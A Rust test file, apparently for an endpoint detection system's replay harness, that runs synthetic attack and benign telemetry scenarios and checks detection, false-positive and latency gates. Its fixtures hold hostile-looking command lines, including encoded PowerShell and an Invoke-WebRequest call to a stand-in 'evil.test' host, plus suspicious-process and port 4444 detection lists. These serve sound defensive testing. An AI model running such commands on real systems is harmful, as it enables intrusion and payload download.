#![allow(clippy::unwrap_used, clippy::expect_used)]

use super::{
    DefaultReplayHarness, DetectorCandidateManifest, DetectorExperimentManifest,
    PromotionReviewRecommendation, ReplayEvaluationReport, ReplayRunBundle, ReplayScenarioClass,
    ReplayScenarioInput, ReplayScenarioManifest, ReplayScenarioMetadata, ReplayScenarioStep,
    ReplaySuiteManifest, ReplaySuiteMetadata, VerificationCorpusManifest,
    load_detector_experiment_manifest, load_verification_manifest, render_evaluation_report,
    render_experiment_report, render_promotion_review_packet, render_replay_run,
    render_shadow_report, render_suite_report, render_verification_report,
};
use serde_json::Value;
use std::fs;
use std::path::{Path, PathBuf};
use std::time::{SystemTime, UNIX_EPOCH};
use swarm_core::ThreatClass;
use swarm_core::config::{PolicyActionSelector, PolicyRuleConfig, PolicyRuleDecision};
use swarm_core::types::{ResponseAction, Severity};
use swarm_whisker::{
    DetectionStrategy, NetworkConnectProfile, ProcessStartEvent, TelemetryEvent, TelemetryPayload,
};

fn permissive_policy_rules() -> Vec<PolicyRuleConfig> {
    use ThreatClass::{
        CommandAndControl, CredentialAccess, DataExfiltration, DefenseEvasion, Discovery,
        Execution, Impact, InitialAccess, LateralMovement, Persistence, PrivilegeEscalation,
        SupplyChain,
    };

    [
        Execution,
        CommandAndControl,
        CredentialAccess,
        DataExfiltration,
        DefenseEvasion,
        Discovery,
        Impact,
        InitialAccess,
        LateralMovement,
        Persistence,
        PrivilegeEscalation,
        SupplyChain,
    ]
    .into_iter()
    .map(|threat_class| PolicyRuleConfig {
        name: format!("replay-test-allow-{threat_class:?}"),
        decision: PolicyRuleDecision::Allow,
        threat_class,
        // Non-destructive selectors only. An empty `actions` list is a wildcard
        // that matches every action kind, including destructive ones, and a
        // matching rule decides outright -- so a wildcard here silently strips
        // the `static.human_gate` verdict these scenarios are written to assert.
        actions: vec![
            PolicyActionSelector::Escalate,
            PolicyActionSelector::DeployDecoy,
        ],
        min_severity: Severity::Low,
        max_severity: Severity::Critical,
        time_window_utc: None,
        max_actions_per_agent_per_minute: None,
        reason: Some("replay tests allow configured response actions".to_string()),
    })
    .collect()
}

fn sample_config() -> swarm_core::config::SwarmConfig {
    let mut config: swarm_core::config::SwarmConfig =
        serde_yaml::from_str(include_str!("../../../../rulesets/default.yaml")).unwrap();
    config.policy.rules = permissive_policy_rules();
    config
}

fn suspicious_event(
    event_id: &str,
    host_id: &str,
    user: &str,
    command_line: &str,
) -> TelemetryEvent {
    TelemetryEvent {
        source: "synthetic".to_string(),
        event_id: event_id.to_string(),
        timestamp: 1_700_000_000_000,
        host_id: Some(host_id.to_string()),
        payload: TelemetryPayload::ProcessStart(ProcessStartEvent {
            parent_process: "WINWORD".to_string(),
            process_name: "powershell".to_string(),
            command_line: command_line.to_string(),
            user: Some(user.to_string()),
            executable_path: None,
            signer: None,
            signature_valid: None,
        }),
    }
}

fn benign_event(event_id: &str) -> TelemetryEvent {
    TelemetryEvent {
        source: "synthetic".to_string(),
        event_id: event_id.to_string(),
        timestamp: 1_700_000_000_000,
        host_id: Some("host-benign".to_string()),
        payload: TelemetryPayload::ProcessStart(ProcessStartEvent {
            parent_process: "launchd".to_string(),
            process_name: "ls".to_string(),
            command_line: "ls -la".to_string(),
            user: Some("alice".to_string()),
            executable_path: None,
            signer: None,
            signature_valid: None,
        }),
    }
}

fn scenario_manifest() -> ReplayScenarioManifest {
    ReplayScenarioManifest {
        name: "office_dropper_correlation".to_string(),
        description: "Two suspicious office child processes should correlate".to_string(),
        seed_time_ms: 1_700_000_100_000,
        requested_by: "replay-whisker".to_string(),
        receipt_chain: vec!["seed-receipt".to_string()],
        metadata: ReplayScenarioMetadata {
            class: ReplayScenarioClass::Adversarial,
            threat_class: Some(ThreatClass::Execution),
            campaign: Some("hellcat.office_loader".to_string()),
            techniques: vec!["T1204.002".to_string(), "T1059.001".to_string()],
            tags: vec!["office".to_string(), "correlation".to_string()],
        },
        input: ReplayScenarioInput::Events {
            events: vec![
                ReplayScenarioStep {
                    action: ResponseAction::IsolateHost {
                        host_id: "host-ops-1".to_string(),
                    },
                    event: suspicious_event(
                        "hunt-evt-1",
                        "host-ops-1",
                        "alice",
                        "powershell.exe -enc AAA=",
                    ),
                },
                ReplayScenarioStep {
                    action: ResponseAction::BlockEgress {
                        target: "198.51.100.20".to_string(),
                    },
                    event: suspicious_event(
                        "hunt-evt-2",
                        "host-ops-1",
                        "alice",
                        "powershell.exe Invoke-WebRequest https://evil.test",
                    ),
                },
            ],
        },
        expectations: serde_yaml::from_str(
            r#"
replay_bundle_count: 2
investigation_count: 2
incident_count: 1
hunts:
  - hunt_id: hunt-evt-1
    action_kind: isolate_host
    policy_verdict: require_human
    response_kind: success
  - hunt_id: hunt-evt-2
    action_kind: block_egress
    policy_verdict: require_human
    response_kind: success
incident_hunt_groups:
  - [hunt-evt-1, hunt-evt-2]
max_detect_latency_us: 5000
max_policy_latency_us: 5000
max_response_latency_us: 5000
"#,
        )
        .unwrap(),
    }
}

fn benign_manifest() -> ReplayScenarioManifest {
    ReplayScenarioManifest {
        name: "benign_baseline".to_string(),
        description: "Benign process tree should not emit replay bundles".to_string(),
        seed_time_ms: 1_700_000_200_000,
        requested_by: "replay-whisker".to_string(),
        receipt_chain: vec![],
        metadata: ReplayScenarioMetadata {
            class: ReplayScenarioClass::Benign,
            threat_class: None,
            campaign: None,
            techniques: Vec::new(),
            tags: vec!["control".to_string()],
        },
        input: ReplayScenarioInput::Events {
            events: vec![ReplayScenarioStep {
                action: ResponseAction::Escalate {
                    summary: "operator review".to_string(),
                    urgency: Severity::Medium,
                },
                event: benign_event("hunt-benign-1"),
            }],
        },
        expectations: serde_yaml::from_str(
            r#"
replay_bundle_count: 0
investigation_count: 0
incident_count: 0
max_detect_latency_us: 5000
max_policy_latency_us: 5000
max_response_latency_us: 5000
"#,
        )
        .unwrap(),
    }
}

fn python_benign_manifest() -> ReplayScenarioManifest {
    ReplayScenarioManifest {
        name: "python_maintenance_benign".to_string(),
        description: "Python maintenance curl should remain benign".to_string(),
        seed_time_ms: 1_700_000_400_000,
        requested_by: "replay-whisker".to_string(),
        receipt_chain: vec![],
        metadata: ReplayScenarioMetadata {
            class: ReplayScenarioClass::Benign,
            threat_class: None,
            campaign: Some("operator_maintenance".to_string()),
            techniques: vec!["T1105".to_string()],
            tags: vec!["control".to_string(), "python".to_string()],
        },
        input: ReplayScenarioInput::Events {
            events: vec![ReplayScenarioStep {
                action: ResponseAction::Escalate {
                    summary: "operator review".to_string(),
                    urgency: Severity::Medium,
                },
                event: TelemetryEvent {
                    source: "synthetic".to_string(),
                    event_id: "hunt-python-benign-1".to_string(),
                    timestamp: 1_700_000_000_400,
                    host_id: Some("host-python".to_string()),
                    payload: TelemetryPayload::ProcessStart(ProcessStartEvent {
                        parent_process: "python".to_string(),
                        process_name: "curl".to_string(),
                        command_line: "curl https://intranet.local/health".to_string(),
                        user: Some("svc-maintenance".to_string()),
                        executable_path: None,
                        signer: None,
                        signature_valid: None,
                    }),
                },
            }],
        },
        expectations: serde_yaml::from_str(
            r#"
replay_bundle_count: 0
investigation_count: 0
incident_count: 0
max_detect_latency_us: 5000
max_policy_latency_us: 5000
max_response_latency_us: 5000
"#,
        )
        .unwrap(),
    }
}

fn pdf_lolbin_manifest() -> ReplayScenarioManifest {
    ReplayScenarioManifest {
        name: "pdf_lolbin_execution".to_string(),
        description: "PDF reader spawning cmd should be suspicious".to_string(),
        seed_time_ms: 1_700_000_300_000,
        requested_by: "replay-whisker".to_string(),
        receipt_chain: vec!["seed-receipt".to_string()],
        metadata: ReplayScenarioMetadata {
            class: ReplayScenarioClass::Adversarial,
            threat_class: Some(ThreatClass::Execution),
            campaign: Some("hellcat.office_loader".to_string()),
            techniques: vec![
                "T1204.002".to_string(),
                "T1059.003".to_string(),
                "T1059.001".to_string(),
            ],
            tags: vec!["pdf".to_string(), "lolbin".to_string()],
        },
        input: ReplayScenarioInput::Events {
            events: vec![ReplayScenarioStep {
                action: ResponseAction::IsolateHost {
                    host_id: "host-pdf-1".to_string(),
                },
                event: TelemetryEvent {
                    source: "synthetic".to_string(),
                    event_id: "hunt-pdf-1".to_string(),
                    timestamp: 1_700_000_000_300,
                    host_id: Some("host-pdf-1".to_string()),
                    payload: TelemetryPayload::ProcessStart(ProcessStartEvent {
                        parent_process: "ACRORD32".to_string(),
                        process_name: "cmd".to_string(),
                        command_line: "cmd.exe /c powershell.exe -enc BBB=".to_string(),
                        user: Some("alice".to_string()),
                        executable_path: None,
                        signer: None,
                        signature_valid: None,
                    }),
                },
            }],
        },
        expectations: serde_yaml::from_str(
            r#"
replay_bundle_count: 1
investigation_count: 1
incident_count: 1
hunts:
  - hunt_id: hunt-pdf-1
    action_kind: isolate_host
    policy_verdict: require_human
    response_kind: success
incident_hunt_groups:
  - [hunt-pdf-1]
max_detect_latency_us: 5000
max_policy_latency_us: 5000
max_response_latency_us: 5000
"#,
        )
        .unwrap(),
    }
}

fn unique_temp_dir(label: &str) -> PathBuf {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let path = std::env::temp_dir().join(format!(
        "swarm-runtime-replay-{label}-{}-{nanos}",
        std::process::id()
    ));
    fs::create_dir_all(&path).unwrap();
    path
}

fn write_scenario(root: &Path, name: &str, manifest: &ReplayScenarioManifest) -> PathBuf {
    let path = root.join(name);
    fs::write(&path, serde_yaml::to_string(manifest).unwrap()).unwrap();
    path
}

fn write_suite(root: &Path, name: &str, manifest: &ReplaySuiteManifest) -> PathBuf {
    let path = root.join(name);
    fs::write(&path, serde_yaml::to_string(manifest).unwrap()).unwrap();
    path
}

fn write_experiment(root: &Path, name: &str, manifest: &DetectorExperimentManifest) -> PathBuf {
    let path = root.join(name);
    fs::write(&path, serde_yaml::to_string(manifest).unwrap()).unwrap();
    path
}

fn write_verification(root: &Path, name: &str, manifest: &VerificationCorpusManifest) -> PathBuf {
    let path = root.join(name);
    fs::write(&path, serde_yaml::to_string(manifest).unwrap()).unwrap();
    path
}

fn replay_without_performance(bundle: &ReplayRunBundle) -> Value {
    serde_json::json!({
        "run_id": bundle.run_id,
        "scenario_name": bundle.scenario_name,
        "scenario_path": bundle.scenario_path,
        "metadata": bundle.metadata,
        "input_kind": bundle.input_kind,
        "seed_time_ms": bundle.seed_time_ms,
        "created_at_ms": bundle.created_at_ms,
        "requested_by": bundle.requested_by,
        "expectations": bundle.expectations,
        "replay_bundles": bundle.replay_bundles,
        "investigations": bundle.investigations,
        "incidents": bundle.incidents,
        "deterministic_summary": bundle.deterministic_summary,
    })
}

#[tokio::test]
async fn event_scenario_runs_deterministically_and_persists_result_bundle() {
    let root = unique_temp_dir("events");
    let results_dir = root.join("results");
    let scenario_path = write_scenario(&root, "office-dropper.yaml", &scenario_manifest());
    let harness =
        DefaultReplayHarness::from_config("inline", sample_config(), &results_dir).unwrap();

    let first = harness.run_scenario_path(&scenario_path).await.unwrap();
    let second = harness.run_scenario_path(&scenario_path).await.unwrap();
    let loaded = harness
        .load_run("replay_run:office_dropper_correlation:1700000100000")
        .unwrap()
        .unwrap();

    assert_eq!(first.record.run_id, second.record.run_id);
    assert_eq!(
        replay_without_performance(&first.bundle),
        replay_without_performance(&second.bundle)
    );
    assert_eq!(loaded.record.run_id, first.record.run_id);
    assert_eq!(first.bundle.deterministic_summary.replay_bundle_count, 2);
    assert_eq!(first.bundle.deterministic_summary.investigation_count, 2);
    assert_eq!(first.bundle.deterministic_summary.incident_count, 1);
    assert!(render_replay_run(&first.bundle).contains("office_dropper_correlation"));

    let _ = fs::remove_dir_all(root);
}

#[tokio::test]
async fn replay_bundle_fixtures_can_drive_offline_replay() {
    let root = unique_temp_dir("bundle-fixtures");
    let results_dir = root.join("results");
    let harness =
        DefaultReplayHarness::from_config("inline", sample_config(), &results_dir).unwrap();

    let source_scenario_path = write_scenario(&root, "source.yaml", &scenario_manifest());
    let source_run = harness
        .run_scenario_path(&source_scenario_path)
        .await
        .unwrap();
    let fixture_path = root.join("fixture-bundle.json");
    fs::write(
        &fixture_path,
        serde_json::to_string_pretty(&source_run.bundle.replay_bundles[0]).unwrap(),
    )
    .unwrap();

    let bundle_manifest = serde_yaml::from_str::<ReplayScenarioManifest>(&format!(
        r#"
name: persisted_bundle_fixture
description: Persisted replay bundles can be re-run offline
seed_time_ms: 1700000300000
requested_by: replay-whisker
input:
  kind: replay_bundles
  paths:
    - {}
expectations:
  replay_bundle_count: 1
  investigation_count: 1
  incident_count: 1
  hunts:
    - hunt_id: hunt-evt-1
      action_kind: isolate_host
      policy_verdict: require_human
      response_kind: success
  incident_hunt_groups:
    - [hunt-evt-1]
"#,
        fixture_path.display()
    ))
    .unwrap();
    let bundle_scenario_path = write_scenario(&root, "bundle-source.yaml", &bundle_manifest);

    let replay_from_bundle = harness
        .run_scenario_path(&bundle_scenario_path)
        .await
        .unwrap();
    assert_eq!(
        replay_from_bundle
            .bundle
            .deterministic_summary
            .replay_bundle_count,
        1
    );
    assert_eq!(
        replay_from_bundle
            .bundle
            .deterministic_summary
            .investigation_count,
        1
    );
    assert_eq!(
        replay_from_bundle
            .bundle
            .deterministic_summary
            .incident_count,
        1
    );

    let _ = fs::remove_dir_all(root);
}

#[tokio::test]
async fn evaluation_report_passes_expected_scenario_and_flags_regressions() {
    let root = unique_temp_dir("evaluation");
    let results_dir = root.join("results");
    let harness =
        DefaultReplayHarness::from_config("inline", sample_config(), &results_dir).unwrap();

    let passing_path = write_scenario(&root, "passing.yaml", &scenario_manifest());
    let passing_report = harness.evaluate_scenario_path(&passing_path).await.unwrap();
    assert!(passing_report.passed);
    assert!(render_evaluation_report(&passing_report).contains("Status: pass"));

    let failing_path = write_scenario(&root, "failing.yaml", &benign_manifest());
    let failing_report: ReplayEvaluationReport =
        harness.evaluate_scenario_path(&failing_path).await.unwrap();
    assert!(failing_report.passed);

    let mut mismatched = scenario_manifest();
    mismatched.expectations.max_detect_latency_us = Some(0);
    let mismatched_path = write_scenario(&root, "mismatched.yaml", &mismatched);
    let regression_report = harness
        .evaluate_scenario_path(&mismatched_path)
        .await
        .unwrap();
    assert!(!regression_report.passed);
    assert!(
        regression_report
            .checks
            .iter()
            .any(|check| check.name == "max_detect_latency_us" && !check.passed)
    );

    let _ = fs::remove_dir_all(root);
}

#[tokio::test]
async fn tracked_repo_scenarios_pass_expectation_gates() {
    let results_dir = unique_temp_dir("repo-scenarios");
    let config_path = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../rulesets/default.yaml");
    let scenarios_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../scenarios");
    let filtered_dir = results_dir.join("default-strategy-scenarios");
    fs::create_dir_all(&filtered_dir).unwrap();
    for scenario in [
        "benign-baseline.yaml",
        "office-dropper-correlation.yaml",
        "pdf-lolbin-execution.yaml",
        "python-maintenance-benign.yaml",
        "scripting-encoded-powershell.yaml",
    ] {
        fs::copy(scenarios_dir.join(scenario), filtered_dir.join(scenario)).unwrap();
    }
    let harness = DefaultReplayHarness::from_path(&config_path, &results_dir).unwrap();

    let suite = harness.evaluate_scenarios_dir(&filtered_dir).await.unwrap();

    assert!(suite.passed);
    assert_eq!(suite.total_scenarios, 5);
    assert!(render_suite_report(&suite).contains("Replay Suite"));

    let _ = fs::remove_dir_all(results_dir);
}

#[tokio::test]
async fn named_suite_manifest_runs_with_metadata_and_technique_groups() {
    let root = unique_temp_dir("suite-manifest");
    let results_dir = root.join("results");
    let scenarios_dir = root.join("scenarios");
    let suites_dir = root.join("scenario-suites");
    fs::create_dir_all(&scenarios_dir).unwrap();
    fs::create_dir_all(&suites_dir).unwrap();

    let office_path = write_scenario(
        &scenarios_dir,
        "office-dropper-correlation.yaml",
        &scenario_manifest(),
    );
    let pdf_path = write_scenario(
        &scenarios_dir,
        "pdf-lolbin-execution.yaml",
        &pdf_lolbin_manifest(),
    );
    let benign_path = write_scenario(
        &scenarios_dir,
        "python-maintenance-benign.yaml",
        &python_benign_manifest(),
    );

    let suite_path = write_suite(
        &suites_dir,
        "hellcat-office-v1.yaml",
        &ReplaySuiteManifest {
            name: "hellcat_office_v1".to_string(),
            description: "Hellcat office corpus".to_string(),
            corpus_version: "test-1".to_string(),
            metadata: Default::default(),
            scenarios: vec![
                office_path.display().to_string(),
                pdf_path.display().to_string(),
                benign_path.display().to_string(),
            ],
        },
    );

    let harness =
        DefaultReplayHarness::from_config("inline", sample_config(), &results_dir).unwrap();
    let suite = harness.evaluate_suite_path(&suite_path).await.unwrap();

    assert!(suite.passed);
    assert_eq!(suite.total_scenarios, 3);
    assert_eq!(
        suite.source_kind,
        super::ReplaySuiteSourceKind::SuiteManifest
    );
    assert!(
        suite
            .technique_groups
            .iter()
            .any(|group| group.technique == "T1204.002")
    );
    assert!(render_suite_report(&suite).contains("hellcat_office_v1"));

    let _ = fs::remove_dir_all(root);
}

#[tokio::test]
async fn experiment_report_persists_and_flags_false_positive_regression() {
    let root = unique_temp_dir("experiment");
    let results_dir = root.join("results");
    let experiments_dir = root.join("experiments-results");
    let scenarios_dir = root.join("scenarios");
    let suites_dir = root.join("scenario-suites");
    let experiments_src_dir = root.join("experiments");
    let verifications_dir = root.join("verifications");
    fs::create_dir_all(&scenarios_dir).unwrap();
    fs::create_dir_all(&suites_dir).unwrap();
    fs::create_dir_all(&experiments_src_dir).unwrap();
    fs::create_dir_all(&verifications_dir).unwrap();

    let office_path = write_scenario(
        &scenarios_dir,
        "office-dropper-correlation.yaml",
        &scenario_manifest(),
    );
    let benign_path = write_scenario(
        &scenarios_dir,
        "python-maintenance-benign.yaml",
        &python_benign_manifest(),
    );
    let suite_path = write_suite(
        &suites_dir,
        "hellcat-office-v1.yaml",
        &ReplaySuiteManifest {
            name: "hellcat_office_v1".to_string(),
            description: "Hellcat office corpus".to_string(),
            corpus_version: "test-1".to_string(),
            metadata: Default::default(),
            scenarios: vec![
                office_path.display().to_string(),
                benign_path.display().to_string(),
            ],
        },
    );
    let verification_path = write_verification(
        &verifications_dir,
        "office-detector-safety-v1.yaml",
        &serde_yaml::from_str::<VerificationCorpusManifest>(&format!(
            r#"
name: office_detector_safety_v1
description: safety corpus
known_bad:
  suite: {}
benign_controls:
  scenarios:
    - {}
canonical_templates:
  - name: office_encoded_powershell_execution
    threat_class: execution
    event:
      source: verification-template
      event_id: tpl-execution-1
      timestamp: 1700000300000
      host_id: template-host-1
      payload:
        kind: process_start
        parent_process: WINWORD
        process_name: powershell
        command_line: powershell -enc SQBFAFgA
        user: alice
resource_budgets:
  max_false_positive_rate: 0.05
  max_detect_latency_us: 10000
  max_total_detections: 8
"#,
            suite_path.display(),
            benign_path.display(),
        ))
        .unwrap(),
    );

    let experiment_path = write_experiment(
        &experiments_src_dir,
        "python-parent-broadening.yaml",
        &serde_yaml::from_str::<DetectorExperimentManifest>(&format!(
            r#"
name: python_parent_broadening
description: broaden suspicious parents to python
corpus:
  suite: {}
verification:
  corpus: {}
candidate:
  strategy: suspicious_process_tree
  strategy_id: python_parent_broadening
  description: add python to suspicious parents
  profile:
    suspicious_parents:
      - winword
      - excel
      - outlook
      - acrord32
      - teams
      - python
    suspicious_children:
      - powershell
      - pwsh
      - cmd
      - sh
      - bash
      - curl
      - wget
    high_confidence_threshold: 0.9
    medium_confidence_threshold: 0.7
lineage:
  parent_strategy_id: suspicious_process_tree
  mutation: broaden suspicious parent set with python
  rationale: explore downloader coverage
gates:
  require_known_bad_coverage: true
  max_false_positive_delta: 0
  max_detect_latency_delta_us: 10000
"#,
            suite_path.display(),
            verification_path.display()
        ))
        .unwrap(),
    );

    let harness =
        DefaultReplayHarness::from_config("inline", sample_config(), &results_dir).unwrap();
    let lookup = harness
        .evaluate_experiment_path(&experiment_path, &experiments_dir)
        .await
        .unwrap();

    assert!(!lookup.report.passed);
    assert!(
        lookup
            .report
            .comparison
            .scenario_regressions
            .iter()
            .any(|regression| regression.reason.contains("false positive"))
    );
    assert!(
        lookup
            .report
            .gates
            .iter()
            .any(|gate| gate.name == "false_positive_delta" && !gate.passed)
    );
    assert!(render_experiment_report(&lookup.report).contains("Detector Experiment"));
    let reloaded = harness
        .load_experiment(&experiments_dir, &lookup.record.experiment_id)
        .unwrap()
        .unwrap();
    assert_eq!(reloaded.record.experiment_id, lookup.record.experiment_id);

    let _ = fs::remove_dir_all(root);
}

#[test]
fn replay_manifest_and_switchboard_accept_network_connect() -> Result<(), Box<dyn std::error::Error>>
{
    let root = unique_temp_dir("network-connect-manifest");
    let experiments_dir = root.join("experiments");
    fs::create_dir_all(&experiments_dir)?;

    let mut config = sample_config();
    config.detection.strategy = "network_connect".to_string();
    config.detection.profiles.network_connect = Some(serde_json::json!({
        "suspicious_ports": [4444],
    }));
    let baseline = super::replay_detector(&config)?;
    assert_eq!(baseline.id(), "network_connect");

    let manifest = DetectorExperimentManifest {
        name: "network-connect-candidate".to_string(),
        description: "network connect replay candidate".to_string(),
        corpus: super::ExperimentCorpusTarget {
            suite: "../scenario-suites/hellcat-office-v1.yaml".to_string(),
        },
        verification: super::ExperimentVerificationTarget {
            corpus: "../verifications/office-detector-safety-v1.yaml".to_string(),
        },
        candidate: DetectorCandidateManifest::NetworkConnect {
            strategy_id: "network_connect_candidate".to_string(),
            description: "network connect candidate".to_string(),
            profile: NetworkConnectProfile {
                suspicious_ports: vec![4444],
                ..NetworkConnectProfile::default()
            },
        },
        lineage: super::ExperimentLineage {
            parent_strategy_id: "network_connect".to_string(),
            mutation: "test".to_string(),
            rationale: "test".to_string(),
        },
        gates: Default::default(),
    };
    let manifest_path = write_experiment(
        &experiments_dir,
        "network-connect-candidate.yaml",
        &manifest,
    );

    let loaded = load_detector_experiment_manifest(&manifest_path)?;
    assert_eq!(loaded.candidate.strategy_id(), "network_connect_candidate");
    let candidate = super::detector_from_candidate(&loaded.candidate)?;
    assert_eq!(candidate.id(), "network_connect_candidate");

    let _ = fs::remove_dir_all(root);
    Ok(())
}

#[tokio::test]
async fn verification_report_persists_and_flags_false_positive_counterexample() {
    let root = unique_temp_dir("verification-report");
    let results_dir = root.join("results");
    let verifications_dir = root.join("verification-results");
    let scenarios_dir = root.join("scenarios");
    let suites_dir = root.join("scenario-suites");
    let experiments_src_dir = root.join("experiments");
    let verification_src_dir = root.join("verifications");
    fs::create_dir_all(&scenarios_dir).unwrap();
    fs::create_dir_all(&suites_dir).unwrap();
    fs::create_dir_all(&experiments_src_dir).unwrap();
    fs::create_dir_all(&verification_src_dir).unwrap();

    let office_path = write_scenario(
        &scenarios_dir,
        "office-dropper-correlation.yaml",
        &scenario_manifest(),
    );
    let benign_path = write_scenario(
        &scenarios_dir,
        "python-maintenance-benign.yaml",
        &python_benign_manifest(),
    );
    let suite_path = write_suite(
        &suites_dir,
        "hellcat-office-v1.yaml",
        &ReplaySuiteManifest {
            name: "hellcat_office_v1".to_string(),
            description: "Hellcat office corpus".to_string(),
            corpus_version: "test-1".to_string(),
            metadata: Default::default(),
            scenarios: vec![
                office_path.display().to_string(),
                benign_path.display().to_string(),
            ],
        },
    );
    let verification_path = write_verification(
        &verification_src_dir,
        "office-detector-safety-v1.yaml",
        &serde_yaml::from_str::<VerificationCorpusManifest>(&format!(
            r#"
name: office_detector_safety_v1
description: safety corpus
known_bad:
  suite: {}
benign_controls:
  scenarios:
    - {}
canonical_templates:
  - name: office_encoded_powershell_execution
    threat_class: execution
    event:
      source: verification-template
      event_id: tpl-execution-1
      timestamp: 1700000300000
      host_id: template-host-1
      payload:
        kind: process_start
        parent_process: WINWORD
        process_name: powershell
        command_line: powershell -enc SQBFAFgA
        user: alice
resource_budgets:
  max_false_positive_rate: 0.0
  max_detect_latency_us: 10000
  max_total_detections: 8
"#,
            suite_path.display(),
            benign_path.display(),
        ))
        .unwrap(),
    );
    let experiment_path = write_experiment(
        &experiments_src_dir,
        "python-parent-broadening.yaml",
        &serde_yaml::from_str::<DetectorExperimentManifest>(&format!(
            r#"
name: python_parent_broadening
description: broaden suspicious parents to python
corpus:
  suite: {}
verification:
  corpus: {}
candidate:
  strategy: suspicious_process_tree
  strategy_id: python_parent_broadening
  description: add python to suspicious parents
  profile:
    suspicious_parents:
      - winword
      - excel
      - outlook
      - acrord32
      - teams
      - python
    suspicious_children:
      - powershell
      - pwsh
      - cmd
      - sh
      - bash
      - curl
      - wget
    high_confidence_threshold: 0.9
    medium_confidence_threshold: 0.7
lineage:
  parent_strategy_id: suspicious_process_tree
  mutation: broaden suspicious parent set with python
  rationale: explore downloader coverage
gates:
  require_known_bad_coverage: true
  max_false_positive_delta: 0
  max_detect_latency_delta_us: 10000
"#,
            suite_path.display(),
            verification_path.display(),
        ))
        .unwrap(),
    );

    let harness =
        DefaultReplayHarness::from_config("inline", sample_config(), &results_dir).unwrap();
    let lookup = harness
        .evaluate_verification_path(&experiment_path, &verifications_dir)
        .await
        .unwrap();

    assert!(!lookup.report.passed);
    assert!(
        lookup
            .report
            .invariants
            .iter()
            .any(|invariant| invariant.name == "false_positive_bound" && !invariant.passed)
    );
    assert!(render_verification_report(&lookup.report).contains("Detector Verification"));
    let reloaded = harness
        .load_verification(&verifications_dir, &lookup.record.verification_id)
        .unwrap()
        .unwrap();
    assert_eq!(
        reloaded.record.verification_id,
        lookup.record.verification_id
    );

    let _ = fs::remove_dir_all(root);
}

#[tokio::test]
async fn shadow_report_persists_for_control_candidate() {
    let root = unique_temp_dir("shadow-report");
    let results_dir = root.join("results");
    let shadows_dir = root.join("shadow-results");
    let scenarios_dir = root.join("scenarios");
    let suites_dir = root.join("scenario-suites");
    let experiments_src_dir = root.join("experiments");
    let verification_src_dir = root.join("verifications");
    fs::create_dir_all(&scenarios_dir).unwrap();
    fs::create_dir_all(&suites_dir).unwrap();
    fs::create_dir_all(&experiments_src_dir).unwrap();
    fs::create_dir_all(&verification_src_dir).unwrap();

    let office_path = write_scenario(
        &scenarios_dir,
        "office-dropper-correlation.yaml",
        &scenario_manifest(),
    );
    let benign_path = write_scenario(
        &scenarios_dir,
        "python-maintenance-benign.yaml",
        &python_benign_manifest(),
    );
    let suite_path = write_suite(
        &suites_dir,
        "hellcat-office-v1.yaml",
        &ReplaySuiteManifest {
            name: "hellcat_office_v1".to_string(),
            description: "Hellcat office corpus".to_string(),
            corpus_version: "test-1".to_string(),
            metadata: Default::default(),
            scenarios: vec![
                office_path.display().to_string(),
                benign_path.display().to_string(),
            ],
        },
    );
    let verification_path = write_verification(
        &verification_src_dir,
        "office-detector-safety-v1.yaml",
        &serde_yaml::from_str::<VerificationCorpusManifest>(&format!(
            r#"
name: office_detector_safety_v1
description: safety corpus
known_bad:
  suite: {}
benign_controls:
  scenarios:
    - {}
canonical_templates:
  - name: office_encoded_powershell_execution
    threat_class: execution
    event:
      source: verification-template
      event_id: tpl-execution-1
      timestamp: 1700000300000
      host_id: template-host-1
      payload:
        kind: process_start
        parent_process: WINWORD
        process_name: powershell
        command_line: powershell -enc SQBFAFgA
        user: alice
resource_budgets:
  max_false_positive_rate: 0.05
  max_detect_latency_us: 10000
  max_total_detections: 8
"#,
            suite_path.display(),
            benign_path.display(),
        ))
        .unwrap(),
    );
    let experiment_path = write_experiment(
        &experiments_src_dir,
        "office-baseline-control.yaml",
        &serde_yaml::from_str::<DetectorExperimentManifest>(&format!(
            r#"
name: office_baseline_control
description: control candidate
corpus:
  suite: {}
verification:
  corpus: {}
candidate:
  strategy: suspicious_process_tree
  strategy_id: office_baseline_control
  description: candidate matches baseline
  profile:
    suspicious_parents:
      - winword
      - excel
      - outlook
      - acrord32
      - teams
    suspicious_children:
      - powershell
      - pwsh
      - cmd
      - sh
      - bash
      - curl
      - wget
    high_confidence_threshold: 0.9
    medium_confidence_threshold: 0.7
lineage:
  parent_strategy_id: suspicious_process_tree
  mutation: control
  rationale: preserve baseline behavior
gates:
  require_known_bad_coverage: true
  max_false_positive_delta: 0
  max_detect_latency_delta_us: 10000
"#,
            suite_path.display(),
            verification_path.display(),
        ))
        .unwrap(),
    );

    let harness =
        DefaultReplayHarness::from_config("inline", sample_config(), &results_dir).unwrap();
    let lookup = harness
        .evaluate_shadow_path(&experiment_path, &shadows_dir)
        .await
        .unwrap();

    assert!(lookup.report.passed);
    assert_eq!(
        lookup.report.comparison.delta.false_positive_rate_delta,
        0.0
    );
    assert!(render_shadow_report(&lookup.report).contains("Shadow Evaluation"));
    let reloaded = harness
        .load_shadow(&shadows_dir, &lookup.record.shadow_id)
        .unwrap()
        .unwrap();
    assert_eq!(reloaded.record.shadow_id, lookup.record.shadow_id);

    let _ = fs::remove_dir_all(root);
}

#[tokio::test]
async fn promotion_review_packet_persists_and_reloads() {
    let root = unique_temp_dir("promotion-review");
    let results_dir = root.join("results");
    let verifications_dir = root.join("verification-results");
    let shadows_dir = root.join("shadow-results");
    let reviews_dir = root.join("promotion-reviews");
    let scenarios_dir = root.join("scenarios");
    let suites_dir = root.join("scenario-suites");
    let experiments_src_dir = root.join("experiments");
    let verification_src_dir = root.join("verifications");
    fs::create_dir_all(&scenarios_dir).unwrap();
    fs::create_dir_all(&suites_dir).unwrap();
    fs::create_dir_all(&experiments_src_dir).unwrap();
    fs::create_dir_all(&verification_src_dir).unwrap();

    let office_path = write_scenario(
        &scenarios_dir,
        "office-dropper-correlation.yaml",
        &scenario_manifest(),
    );
    let benign_path = write_scenario(
        &scenarios_dir,
        "python-maintenance-benign.yaml",
        &python_benign_manifest(),
    );
    let suite_path = write_suite(
        &suites_dir,
        "hellcat-office-v1.yaml",
        &ReplaySuiteManifest {
            name: "hellcat_office_v1".to_string(),
            description: "Hellcat office corpus".to_string(),
            corpus_version: "test-1".to_string(),
            metadata: Default::default(),
            scenarios: vec![
                office_path.display().to_string(),
                benign_path.display().to_string(),
            ],
        },
    );
